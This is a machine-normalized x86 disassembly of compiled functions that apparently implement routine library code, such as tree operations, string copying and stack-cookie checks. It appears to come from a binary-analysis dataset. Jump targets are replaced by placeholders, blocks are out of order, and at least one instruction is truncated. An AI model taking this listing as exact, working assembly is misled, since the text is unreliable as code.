mov [ eax + ebx ] 0x0
call sub_44866d
retn 0x8
mov eax esi
mov eax esi
mov eax [ esi ]
jmp r-xdata
push ebx
push eax
push [ ebp + 0x8 ]
call sub_4247f0
add esp 0xc
sub_405831
push ebp
mov ebp esp
sub esp 0x308
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax 0xff
jle r-xdata
push ebx
push edi
push ecx
call sub_405d3b
pop ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
lea ecx [ ebp - 0x304 ]
lea eax [ ebp - 0x104 ]
call sub_403142
lea edi [ ebp - 0x304 ]
mov ebx esi
sub edi esi
mov [ ebp - 0x308 ] 0x100
add ebx 0x2
dec [ ebp - 0x308 ]
jne r-xdata
push 0x11e
push r--data
push r--data
call sub_4258e2
add esp 0xc
movzx eax [ edi + ebx ]
mov [ ebx ] ax
and eax 0x7000
xor ecx ecx
cmp cx ax
je r-xdata
mov eax 0x4000
or [ esi + 0xbe ] ax
mov eax 0x2000
or [ esi + 0x12 ] ax
mov ecx eax
or [ esi + 0x40 ] cx
mov eax 0x1000
or [ esi + 0x18 ] ax
mov ecx eax
or [ esi + 0x14 ] cx
or [ esi + 0x1a ] cx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
sub_4058f9
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ edi + 0x2d ] 0x0
je r-xdata
lea eax [ ebp + 0x10 ]
call sub_405d05
mov edx [ edi ]
cmp [ edx + 0x2d ] 0x0
je r-xdata
push r--data
call sub_446ae2
mov eax [ edi + 0x8 ]
cmp [ eax + 0x2d ] 0x0
je r-xdata
mov ebx [ edi + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ebx [ eax + 0x8 ]
cmp eax edi
jne r-xdata
mov ebx edx
jmp r-xdata
cmp [ ebx + 0x2d ] 0x0
mov esi [ edi + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ edi ]
mov [ eax ] edx
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] edi
jne r-xdata
mov [ ebx + 0x4 ] esi
cmp [ ebx + 0x2d ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] edi
jne r-xdata
mov [ eax + 0x4 ] ebx
jmp r-xdata
mov [ esi ] ebx
mov edx [ edi + 0x8 ]
mov [ eax + 0x8 ] edx
mov ecx [ edi + 0x8 ]
mov [ ecx + 0x4 ] eax
mov [ ebx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] edi
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi ] ebx
jmp r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx ] edi
jne r-xdata
mov ecx [ edi + 0x4 ]
cmp [ ecx ] edi
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
cmp [ edx + 0x8 ] edi
jne r-xdata
cmp [ ebx + 0x2d ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov dl [ edi + 0x2c ]
mov cl [ eax + 0x2c ]
mov [ eax + 0x2c ] dl
mov [ edi + 0x2c ] cl
cmp [ edi + 0x2c ] 0x1
jne r-xdata
cmp [ ebx + 0x2d ] 0x0
je r-xdata
mov eax [ ebx ]
mov ecx ebx
jmp r-xdata
mov ecx esi
jmp r-xdata
lea eax [ edi + 0xc ]
push eax
call sub_406a4d
push edi
call sub_424fc7
pop ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov ecx ebx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ eax + 0x2d ] 0x0
je r-xdata
mov [ edx ] ecx
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
cmp ebx [ eax + 0x4 ]
jne r-xdata
cmp [ eax + 0x2d ] 0x0
je r-xdata
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ ebx + 0x2c ] 0x1
jne r-xdata
jmp r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov [ ebx + 0x2c ] 0x1
mov ecx [ esi ]
cmp ebx ecx
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
cmp [ ecx + 0x2d ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x2c ] 0x1
mov ecx esi
mov [ esi + 0x2c ] 0x0
call sub_405c67
mov ecx [ esi ]
cmp [ ecx + 0x2d ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x2c ] 0x1
mov ecx esi
mov [ esi + 0x2c ] 0x0
call sub_405c16
mov ecx [ esi + 0x8 ]
mov ebx esi
mov esi [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x2c ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x2c ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x2c ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x2c ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x2c ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x2c ] 0x1
je r-xdata
mov al [ esi + 0x2c ]
push [ ebp + 0x8 ]
mov [ ecx + 0x2c ] al
mov [ esi + 0x2c ] 0x1
mov eax [ ecx ]
mov ecx esi
mov [ eax + 0x2c ] 0x1
call sub_405c67
mov eax [ ecx + 0x8 ]
push [ ebp + 0x8 ]
mov [ eax + 0x2c ] 0x1
mov [ ecx + 0x2c ] 0x0
call sub_405c16
mov ecx [ esi ]
mov [ ecx + 0x2c ] 0x0
mov al [ esi + 0x2c ]
push [ ebp + 0x8 ]
mov [ ecx + 0x2c ] al
mov [ esi + 0x2c ] 0x1
mov eax [ ecx + 0x8 ]
mov ecx esi
mov [ eax + 0x2c ] 0x1
call sub_405c16
jmp r-xdata
mov eax [ ecx ]
push [ ebp + 0x8 ]
mov [ eax + 0x2c ] 0x1
mov [ ecx + 0x2c ] 0x0
call sub_405c67
mov ecx [ esi + 0x8 ]
sub_405b57
mov eax [ edi + 0x4 ]
push esi
push [ eax + 0x4 ]
mov ecx edi
call sub_405bd8
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov esi [ edi + 0x4 ]
mov [ esi + 0x8 ] esi
and [ edi + 0x8 ] 0x0
pop esi
retn
sub_405b80
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
call sub_405ff7
mov [ esi + 0x4 ] eax
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x2c ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x2d ] 0x1
mov eax esi
retn 0x4
sub_405bd8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x2d ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ esi + 0x8 ]
mov ecx ebx
call sub_405bd8
mov esi [ esi ]
lea eax [ edi + 0xc ]
push eax
call sub_406a4d
push edi
call sub_424fc7
cmp [ esi + 0x2d ] 0x0
pop ecx
mov edi esi
je r-xdata
sub_405c16
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x2d ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ edx ] eax
jmp r-xdata
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_405c67
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x2d ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx ] eax
mov [ edx + 0x8 ] eax
jmp r-xdata
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_405d05
mov ecx [ eax ]
push ebx
xor bl bl
cmp [ ecx + 0x2d ] bl
jne r-xdata
pop ebx
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x2d ] bl
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x2d ] bl
je r-xdata
jmp r-xdata
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] ecx
mov ecx [ edx ]
cmp [ ecx + 0x2d ] bl
je r-xdata
mov [ eax ] ecx
mov edx ecx
mov [ eax ] edx
pop ebx
retn
sub_405d3b
push 0x14
mov eax sub_44cb8e
call sub_448595
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_44726a
and [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov esi rw-data
mov [ ebp - 0x10 ] edi
call sub_402e7e
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_402fcf
mov esi eax
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_447292
mov eax esi
call sub_44866d
retn
test edi edi
je r-xdata
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_403197
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov esi edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
call sub_402eaf
push esi
call sub_446da6
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_42535f
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_426f77
sub_405de9
push 0x58
mov eax sub_44b5dc
call sub_448595
push [ ebp + 0x8 ]
lea eax [ ebp - 0x34 ]
push eax
call sub_40652c
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x64 ]
push ecx
mov ecx eax
call sub_406544
add esp 0xc
push r--data
lea eax [ ebp - 0x64 ]
push eax
call sub_426f77
int3
sub_405e22
push 0x24
mov eax sub_44cb6b
call sub_448595
push [ ebp + 0x8 ]
lea eax [ ebp - 0x30 ]
push eax
call sub_40652c
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
mov [ eax + 0x14 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x18 ] ecx
mov ecx [ ebp + 0x14 ]
push eax
mov [ eax + 0x1c ] ecx
call sub_405de9
sub_405e71
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp [ ebp + 0x8 ] eax
jbe r-xdata
leave
retn
cmp [ ebp + 0x8 ] 0xffffffff
ja r-xdata
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_4252f8
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_426f77
push [ ebp + 0x8 ]
call sub_424ff8
pop ecx
test eax eax
jne r-xdata
sub_405eb8
push 0x14
mov eax sub_44a7db
call sub_448595
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_44726a
and [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov esi rw-data
mov [ ebp - 0x10 ] edi
call sub_402e7e
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_402fcf
mov esi eax
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_447292
mov eax esi
call sub_44866d
retn
test edi edi
je r-xdata
push [ ebp + 0x8 ]
lea esi [ ebp - 0x10 ]
call sub_4061f0
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov esi edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
call sub_402eaf
push esi
call sub_446da6
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_42535f
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_426f77
sub_405f54
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0xc ] 0x0
lea edi [ ebp - 0xb ]
stosd [ edi ]
stosb [ edi ]
mov ebx ecx
lea eax [ ebp - 0xc ]
xor edi edi
sub ebx eax
lea esi [ ebp + edi - 0xc ]
mov al [ ebx + esi ]
mov [ ebp - 0x14 ] al
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x204 ]
push [ ebp - 0x14 ]
mov eax [ ecx ]
call [ eax + 0x18 ]
inc edi
mov [ esi ] al
cmp edi 0x5
jb r-xdata
mov ebx [ ebp - 0x10 ]
lea eax [ ebp - 0x7 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_40655a
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
sub_405ff7
push ebp
mov ebp esp
sub esp 0x10
cmp eax 0x5555555
ja r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_4252f8
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_426f77
imul eax eax 0x30
push eax
call sub_424ff8
pop ecx
test eax eax
jne r-xdata
leave
retn
sub_406039
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] r--data
mov ecx [ edi + 0x4 ]
mov [ esi + 0x4 ] ecx
test ecx ecx
je r-xdata
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ ecx ]
call [ eax + 0xc ]
sub_40608e
push 0x8
mov eax sub_44a7b8
call sub_448595
mov esi ecx
mov [ ebp - 0x14 ] esi
and [ ebp - 0x10 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ ebp + 0x8 ]
mov ecx esi
call sub_4060fc
mov eax [ esi + 0x24 ]
mov [ esi ] r--data
mov [ esi + 0xc ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x24 ] r--data
mov eax [ esi + 0x24 ]
mov eax [ eax + 0x4 ]
and [ eax + esi + 0x20 ] 0x0
mov eax esi
call sub_44866d
retn 0x8
mov [ esi + 0x24 ] r--data
mov [ esi + 0x2c ] r--data
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
sub_4060fc
push 0x4
mov eax sub_44a781
call sub_448595
mov esi ecx
mov [ ebp - 0x10 ] esi
mov ebx [ ebp + 0x8 ]
push ebx
call sub_425400
mov [ esi ] r--data
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx eax
je r-xdata
push eax
lea ecx [ esi + 0xc ]
call sub_406039
mov [ esi ] r--data
mov [ esi + 0xc ] r--data
mov eax [ ebx + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax esi
call sub_44866d
retn 0x4
lea eax [ ebx + 0xc ]
sub_40619e
push esi
push edi
mov edi eax
lea esi [ edi + 0x28 ]
mov eax [ esi ]
test eax eax
jg r-xdata
or eax 0xffffffff
[ esi ] eax
jne r-xdata
push 0xc5
push r--data
push r--data
call sub_4258e2
add esp 0xc
pop edi
pop esi
retn
call sub_406307
and [ edi + 0x20 ] 0x0
mov esi [ edi + 0x24 ]
and [ edi + 0x24 ] 0x0
test esi esi
je r-xdata
call sub_40379c
sub_4061f0
push 0x2c
mov eax sub_44a75e
call sub_448595
and [ ebp - 0x10 ] 0x0
test esi esi
je r-xdata
push 0x4
pop eax
call sub_44866d
retn
cmp [ esi ] 0x0
jne r-xdata
push 0x18
call sub_424ff8
pop ecx
mov [ ebp - 0x14 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea eax [ ebp - 0x38 ]
push eax
call sub_402d9b
push ecx
lea eax [ ebp - 0x38 ]
push eax
call sub_402d21
mov [ ebp - 0x4 ] 0x1
push [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x1
call sub_406342
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ esi ] eax
je r-xdata
sub_4062e4
push ebp
mov ebp esp
sub esp 0x30
add ecx 0xffffffd4
push 0x1
push ecx
lea ecx [ ebp - 0x30 ]
call sub_40608e
push r--data
lea eax [ ebp - 0x30 ]
push eax
call sub_426f77
int3
sub_406307
mov eax [ edi + 0x4 ]
push esi
push [ eax + 0x4 ]
mov ecx edi
call sub_4063f4
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov esi [ edi + 0x4 ]
mov [ esi + 0x8 ] esi
and [ edi + 0x8 ] 0x0
pop esi
retn
sub_40636f
push 0x4
mov eax sub_44b594
call sub_448595
mov ebx ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi + 0x24 ] r--data
mov [ esi + 0x2c ] r--data
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push ebx
mov ecx esi
mov [ ebp - 0x10 ] edi
call sub_4060fc
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x24 ]
mov [ esi ] r--data
lea ecx [ esi + 0xc ]
mov [ ecx ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x24 ] r--data
mov eax [ esi + 0x24 ]
mov eax [ eax + 0x4 ]
lea edx [ eax - 0x8 ]
mov [ eax + esi + 0x20 ] edx
test ebx ebx
je r-xdata
xor ebx ebx
add ebx 0xc
jmp r-xdata
push ecx
call sub_4036cb
pop ecx
mov eax esi
call sub_44866d
retn 0x8
sub_4063f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ esi + 0x8 ]
mov ecx ebx
call sub_4063f4
mov esi [ esi ]
lea eax [ edi + 0xc ]
call sub_40699b
push edi
call sub_424fc7
cmp [ esi + 0x15 ] 0x0
pop ecx
mov edi esi
je r-xdata
sub_40645a
push 0x4
mov eax sub_449f4d
call sub_4485c8
mov esi [ ebp + 0x8 ]
call sub_42587d
mov edi eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ ebp - 0x4 ] eax
call sub_4466a8
mov eax r--data
call sub_4069b5
mov [ esi + 0x8 ] eax
call sub_4466a8
mov eax r--data
call sub_4069b5
mov [ esi + 0x10 ] eax
call sub_4466a8
mov eax r--data
call sub_4069b5
mov [ esi + 0x14 ] eax
call sub_4466a8
mov eax [ edi ]
mov al [ eax ]
mov [ esi + 0xc ] al
call sub_4466a8
mov eax [ edi + 0x4 ]
mov al [ eax ]
mov [ esi + 0xd ] al
call sub_4466a8
mov [ esi + 0xc ] 0x2e
call sub_4466a8
mov [ esi + 0xd ] 0x2c
call sub_44866d
retn 0x4
sub_40655a
push 0x28
mov eax sub_44cb3e
call sub_4485fe
mov edi ecx
cmp edi [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x8 ]
push edi
call sub_40a9f6
movzx esi ax
xor eax eax
pop ecx
pop ecx
cmp ax si
jne r-xdata
push 0x207
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ax si
call sub_448681
retn 0x4
push [ ebp + 0x8 ]
mov ecx edi
lea esi [ ebp - 0x2c ]
call sub_40aa3e
xor esi esi
mov [ ebp - 0x4 ] esi
mov edx [ ebp - 0x1c ]
push 0x10
mov [ ebp - 0x30 ] edx
pop edi
cmp edx esi
jbe r-xdata
mov ecx [ ebp - 0x2c ]
mov eax ecx
cmp [ ebp - 0x18 ] edi
jae r-xdata
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] edi
jae r-xdata
add eax edx
cmp [ ebp - 0x18 ] edi
jae r-xdata
lea eax [ ebp - 0x2c ]
mov al [ eax + esi ]
mov ecx [ ebx + 0x204 ]
mov [ ebp - 0x34 ] al
push [ ebp - 0x34 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov ecx [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] edi
jae r-xdata
lea eax [ ebp - 0x2c ]
push eax
push ecx
call sub_40aa61
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
movzx esi ax
call sub_40487c
lea ecx [ ebp - 0x2c ]
mov [ ecx + esi ] al
inc esi
cmp esi [ ebp - 0x30 ]
jb r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
sub_406630
push 0x7c
mov eax sub_44e463
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov ebx ecx
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x4c ] eax
mov esi edx
mov eax r--data
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x30 ] eax
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x210 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x2c ] cl
lea eax [ ebx + 0x8 ]
push esi
push eax
lea edi [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x38 ] eax
call sub_40d1fb
cmp [ eax ] esi
je r-xdata
push [ ebp - 0x3c ]
lea esi [ ebx + 0x21c ]
call sub_406fab
mov ecx eax
mov edi esi
call sub_406adc
mov edi [ ebp - 0x50 ]
lea eax [ ebp - 0x30 ]
push eax
push ebx
mov ecx edi
lea edx [ ebp - 0x6c ]
call sub_40adf5
push 0xd5
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x30 ] edi
push r--data
push r--data
sete al
push r--data
movzx eax al
push 0x5
push eax
call sub_403978
lea eax [ ebp - 0x88 ]
push eax
call sub_40afa2
add esp 0x1c
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x4
call sub_406cd3
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_4069e4
push [ ebp - 0x38 ]
call sub_406b0f
mov edx eax
lea ecx [ ebp - 0x60 ]
call sub_40b008
mov [ esp ] 0x210
call sub_424ff8
mov edi eax
pop ecx
test edi edi
je r-xdata
mov eax [ ebp - 0x34 ]
movsx eax [ eax ]
cmp eax 0x3f
jg r-xdata
and [ ebp - 0x38 ] 0x0
and [ edi + 0x4 ] 0x0
push [ ebp - 0x38 ]
lea ebx [ edi + 0x8 ]
mov [ edi ] r--data
call sub_405317
mov ebx [ ebp - 0x44 ]
mov [ ebp - 0x38 ] edi
jmp r-xdata
sub eax 0x5b
je r-xdata
je r-xdata
mov esi [ ebp - 0x4c ]
mov [ esi ] edi
mov eax [ ebp - 0x3c ]
mov ebx esi
mov [ ebp - 0x4 ] 0x5
call sub_407bf1
xor ebx ebx
lea eax [ ebp - 0x6c ]
inc ebx
push eax
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x4 ] 0x2
call sub_4069e4
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_40487c
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
mov esi eax
call sub_40379c
call sub_406b2e
mov ecx [ ebp - 0x38 ]
lea edi [ eax + 0x30 ]
call sub_406b5e
call sub_406b2e
mov ecx [ ebx ]
mov [ eax + 0x48 ] ecx
call sub_406b2e
mov ecx [ ebx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_406b2e
mov ebx eax
call sub_40700b
call sub_407047
xor edi edi
mov [ esi ] edi
mov eax [ esi + 0x4 ]
mov [ esi + 0x4 ] edi
cmp eax edi
je r-xdata
inc [ ebp - 0x34 ]
push 0x7
dec eax
je r-xdata
cmp eax 0x24
je r-xdata
mov eax esi
call sub_448681
retn 0x8
call sub_40619e
cmp [ ebp - 0x34 ] esi
push 0xc4
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0x5
push eax
call sub_403978
add esp 0x18
test al al
je r-xdata
inc [ ebp - 0x34 ]
cmp [ ebp - 0x34 ] esi
je r-xdata
dec eax
dec eax
je r-xdata
inc [ ebp - 0x34 ]
jmp r-xdata
cmp eax 0x28
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp - 0x38 ]
mov ecx esi
lea edx [ ebp - 0x34 ]
call sub_40ab3c
cmp eax 0x1c
jne r-xdata
push 0x2
jmp r-xdata
lea edx [ ebp - 0x34 ]
call sub_40d26c
jmp r-xdata
sub eax 0x1e
jmp r-xdata
inc [ ebp - 0x34 ]
jmp r-xdata
cmp eax 0x29
je r-xdata
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x30 ] eax
cmp eax esi
je r-xdata
pop eax
cmp eax 0x3
jne r-xdata
jne r-xdata
jle r-xdata
xor al al
push esi
push [ ebp - 0x38 ]
lea edi [ ebp - 0x30 ]
call sub_40d1fb
cmp [ eax ] esi
je r-xdata
cmp eax 0x2b
jle r-xdata
mov eax [ ebp - 0x30 ]
movsx eax [ eax ]
cmp eax 0x3f
jg r-xdata
cmp eax 0x2e
sub eax 0x5b
je r-xdata
je r-xdata
inc [ ebp - 0x30 ]
push 0x7
dec eax
je r-xdata
cmp eax 0x24
je r-xdata
mov al 0x1
jmp r-xdata
inc [ ebp - 0x30 ]
cmp [ ebp - 0x30 ] esi
je r-xdata
dec eax
dec eax
je r-xdata
inc [ ebp - 0x30 ]
cmp eax 0x28
je r-xdata
push 0xcd
push r--data
push r--data
push r--data
push 0x5
push eax
call sub_403978
lea edi [ ebx + 0x224 ]
add esp 0x18
lea ebx [ ebp - 0x2c ]
call sub_406b96
mov ebx [ ebp - 0x44 ]
mov [ ebp - 0x3c ] eax
push 0x2
jmp r-xdata
lea edx [ ebp - 0x30 ]
call sub_40d26c
jmp r-xdata
sub eax 0x1e
jmp r-xdata
cmp eax 0x29
je r-xdata
pop eax
cmp eax 0x4
jne r-xdata
jne r-xdata
inc [ ebp - 0x30 ]
jmp r-xdata
jle r-xdata
cmp eax 0x2b
jle r-xdata
cmp eax 0x2e
sub_4069b5
push esi
push edi
mov edi eax
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ eax + 0x1 ]
push esi
call sub_4255cd
pop ecx
test esi esi
je r-xdata
pop edi
pop esi
retn
mov ecx eax
sub ecx edi
mov dl [ edi ]
mov [ ecx + edi ] dl
inc edi
dec esi
jne r-xdata
sub_4069e4
push 0x0
mov eax sub_449f32
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c2c3
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_406a4d
push 0x0
mov eax sub_44cb1b
call sub_448595
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
mov ecx esi
call sub_40487c
call sub_44866d
retn 0x4
call sub_40619e
sub_406adc
push ebp
